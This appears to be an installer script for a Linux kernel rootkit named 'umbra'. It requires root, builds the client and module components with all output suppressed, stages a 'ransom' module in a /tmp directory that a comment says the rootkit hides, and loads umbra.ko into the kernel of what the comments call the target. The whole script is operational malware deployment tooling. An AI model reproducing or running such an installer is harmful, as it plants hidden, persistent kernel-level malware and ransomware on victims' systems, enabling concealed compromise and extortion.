#!/bin/bash
if (( $EUID != 0 )); then
    echo "Please use sudo or run as root"
    exit
fi

# You need to have compiled umbra.ko by now, either on the target or a machine with the same header files
# Installing module
cd client &> /dev/zero
make &> /dev/zero
cd ../modules &> /dev/zero
make &> /dev/zero
cd .. &> /dev/zero
mkdir /tmp/umbra &> /dev/zero #secret dir for umbra, hidden by the rootkit
cp modules/ransom /tmp/umbra &> /dev/zero

cd kernel &> /dev/zero
insmod ./umbra.ko

if [[ $(lsmod | grep umbra) = *umbra* ]]; then
    echo "Install success"
else
    echo "Install fail"
fi